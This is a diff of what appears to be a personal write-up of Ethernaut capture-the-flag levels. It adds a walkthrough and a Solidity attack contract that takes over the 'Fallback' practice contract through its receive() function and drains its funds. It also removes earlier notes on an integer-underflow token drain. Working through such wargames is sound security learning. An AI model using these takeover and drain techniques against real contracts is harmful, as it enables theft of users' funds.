@@ -1,16 +1,53 @@
-Instance address: 0x3dea6e9a46031D76e9D83bCc119785a604098Ef0
+Level 1
+==========================================================================================================================================
 
-Level address: 0xDc0c34CFE029b190Fc4A6eD5219BF809F04E57A3
+Deployment transaction: https://goerli.etherscan.io/tx/0x3518fe01dfc4ee56725311f18f048eab90f7229a9375eb289335e5cebf6a7f86
+Submission transaction: https://goerli.etherscan.io/tx/0xccc14269f191440a72a09ba47a71a7c4e77f6861f257f279516c8690231c5a49
 
-Level instance creation transaction: https://goerli.etherscan.io/tx/0xe6ce3cd7a96b77f268c10138934ffcba6709f9bad9542cac639a6a05961ea706
-Level instance submission transaction: https://goerli.etherscan.io/tx/0x83588a9985bcf9d87180285c126e27e6313cc54349b84e1d5f89a910c715f587
+-------
+This challenge's task is to aquire contract ownership then withdraw all funds from it. 
+The target contract does have a receive() function, an alternative to fallback functions that only gets executed when a contract receives Ether. 
+To access the receive function, though, first we need to contribute to the contract. We do this by transfering any amount smaller than 0.001 Ether.
+After that, we can push the attack, by sending any amount of ether. I opted to use the call low-level function, as it returns booleans upon succesfull transfers.
+If it's successful, we go forward to the withdraw function call and finish the script.
 
-Ethernaut asks us to withdraw as many tokens as possible.
-For this exploitation, the only method that accepts user-input directly or indirectly is transfer().
+#### Exploit contract:
 
-The intention is to withdraw a value bigger than one's original balance. Since the balances mapping maps addresses to uints and _value is an uint as well, we can conclude that
-any negative value placed will actually represent an overflown positive integer. If balances[addressX] becomes - 3; the contract will actually display the value 2^256 -3.
+```
+    interface Fallback{
+    function contribute() external payable;
+    function getContribution() external view returns(uint);
+    function withdraw () external;
+}
 
-For that reason, the _value passed at the transfer function should be equal to a user's balance minus one. 
+contract fallbackAttack {
+    address private target;
+
+    constructor (address _target)  payable {
+        target = _target;
+    }
+
+    function contribute() payable external {
+        Fallback(target).contribute{value:  msg.value}();
+        
+    }
+
+    function claimOwnership() payable external {
+        (bool sent, bytes memory data) = target.call{value:  msg.value}("");
+        require (sent, "E1");
+  
+        
+    }
+
+    function withdraw() payable external {
+        Fallback(target).withdraw();
+        
+    }
+}
+
+```
+[Claim ownership tx]('https://goerli.etherscan.io/tx/0xecfc69941b1241e7bb967b968b6ae03808826c38e9c1e38b705553ead4078687')
+
+I spent over an hour debugging only to find out I spotted the receive function at the target's contract, but didn't actually implement any fallback function of my own. Lesson learned hahaha.
 
 
